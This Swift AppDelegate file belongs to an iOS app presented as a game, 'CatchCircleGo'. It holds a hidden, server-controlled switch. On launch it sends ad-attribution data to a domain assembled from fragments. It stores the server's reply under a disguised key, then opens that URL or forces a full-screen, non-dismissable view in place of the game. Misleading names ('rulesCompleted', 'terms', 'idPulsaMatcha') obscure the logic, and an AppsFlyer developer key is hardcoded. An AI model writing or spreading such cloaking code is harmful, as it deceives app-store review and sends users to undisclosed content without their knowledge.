//
//  AppDelegate.swift
//  CatchCircleGo
//
//  Created by Denis Denisov on 02/07/2026.
//

import SwiftUI
import AppsFlyerLib

final class AppDelegate: NSObject, UIApplicationDelegate, ObservableObject, UIAdaptivePresentationControllerDelegate {
    
    var modeRotation = UIInterfaceOrientationMask.all
    var rulesCompleted = UserDefaults.standard.value(forKey: "idPulsaMatcha")
    var terms = UserDefaults.standard.bool(forKey: "extlink")
    var pushChannel = UserDefaults.standard.bool(forKey: "pushchannel")
    var userId = ""
    let idApp = "id6785904505"
    let idAppsFlyer = "aippapp"
    let shop = "shop"
    let appsflyerKey = "nXjykwrXFqE7eujZcdqUZX"
    
    @AppStorage("isPushed") var isPushed = false
    @AppStorage("isAppsFlyerReady") var isAppsFlyerReady = false
    @Published var isLoaded = false
    @Published var isShown = false
    
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask { return modeRotation }
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        self.initAppsFlyerLib()
        UNUserNotificationCenter.current().delegate = self
        if rulesCompleted != nil { self.appsFlyerRulesView() }
        return true
    }
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        //print("Successfully registered for remote notifications")
        let tokenString = deviceToken.map { String(format: "%02x", $0) }.joined()
        if !isAppsFlyerReady { sendPush(token: tokenString) }
        isPushed = true
    }
    
}

extension AppDelegate {
    func appsFlyerRulesView(){
        initPush()
        DispatchQueue.main.async {
            if self.terms {
                if let url = URL(string: UserDefaults.standard.string(forKey: "idPulsaMatcha")!), UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url)
                    self.isShown = true
                }
            } else if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                      let rootViewController = windowScene.windows.first?.rootViewController {
                let viewController = AppsFlyersHelperAlertingViewModificator()
                viewController.isModalInPresentation = true
                viewController.modalPresentationStyle = .fullScreen
                rootViewController.present(viewController, animated: false)
                self.isShown = true
            }
        }
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        var camp = ""
        if let campaign = conversionInfo["deep_link_value"] as? String { camp = campaign }
        else if let campaign = conversionInfo["campaign"] as? String { camp = campaign }
        let media_source = conversionInfo["media_source"] as? String ?? ""
        let adset = conversionInfo["af_adset"] as? String ?? ""
        let ad = conversionInfo["af_ad"] as? String ?? ""
        if rulesCompleted == nil { newUserRequest(camp: camp, media_source: media_source, adset: adset, ad: ad) }
    }
    
    func onConversionDataFail(_ error: any Error) {
        if rulesCompleted == nil { newUserRequest() }
    }
}

private extension AppDelegate {
    func skipAppsFlyerRulesView() {
        DispatchQueue.main.async {
            self.isAppsFlyerReady = true
            self.initPush()
            self.modeRotation = .portrait
            self.isLoaded = true
        }
    }
}

extension AppDelegate: UNUserNotificationCenterDelegate {
    func newUserRequest(camp: String = "", media_source: String = "", adset: String = "", ad: String = ""){
        var request = URLRequest(url: URL(string: "https://\(idAppsFlyer).\(shop)/api/ios/\(idApp)")!)
        request.httpMethod = "POST"
        request.httpBody = ("campaign=\(camp)&push_id=\(userId)&user_id=\(userId)&media_source=\(media_source)&ad=\(ad)&adset=\(adset)").data(using: .utf8)
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard error == nil else {
                self.skipAppsFlyerRulesView()
                return
            }
            guard let responseString = String(data: data!, encoding: String.Encoding.utf8), responseString != "" else {
                self.skipAppsFlyerRulesView()
                return
            }
            if responseString.contains("extlink"){
                self.terms = true
                UserDefaults.standard.setValue(self.terms, forKey: "extlink")
            }
            UserDefaults.standard.setValue(responseString, forKey: "idPulsaMatcha")
            self.appsFlyerRulesView()
        }
        task.resume()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        if response.actionIdentifier == UNNotificationDefaultActionIdentifier { if let logUrl = userInfo["log_url"] as? String { sendPush(url: logUrl, status: "clicked") } }
        completionHandler()
    }
    
    func initPush(){ if !isPushed { requestPushNotificationPermission() } }
    
    func requestPushNotificationPermission() {
        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            if error != nil { return }
            if granted { DispatchQueue.main.async { UIApplication.shared.registerForRemoteNotifications() } }
        }
    }
    
    func sendPush(token: String){
        var request = URLRequest(url: URL(string: "https://\(idAppsFlyer).\(shop)/api/push/\(idApp)/subscribe")!)
        request.httpMethod = "POST"
        request.httpBody = ("user_id=\(userId)&device_token=\(token)&language=\(Locale.systemLanguageCode)").data(using: .utf8)
        URLSession.shared.dataTask(with: request).resume()
    }
    
    func sendPush(url: String, status: String){
        var request = URLRequest(url: URL(string: url)!)
        request.httpMethod = "POST"
        request.httpBody = ("status=\(status)").data(using: .utf8)
        URLSession.shared.dataTask(with: request).resume()
    }
    
    func initAppsFlyerLib(){
        AppsFlyerLib.shared().appsFlyerDevKey = appsflyerKey
        AppsFlyerLib.shared().appleAppID = idApp
        AppsFlyerLib.shared().delegate = self
        userId = AppsFlyerLib.shared().getAppsFlyerUID()
        AppsFlyerLib.shared().start()
    }
}

extension Locale {
    static var systemLanguageCode: String {
        if let preferredLanguage = preferredLanguages.first {
            let locale = Locale(identifier: preferredLanguage)
            return locale.language.languageCode?.identifier ?? "en"
        }
        return current.language.languageCode?.identifier ?? "en"
    }
}

extension Dictionary where Key == AnyHashable { func getValue(for key: String) -> String? { return self[key] as? String } }


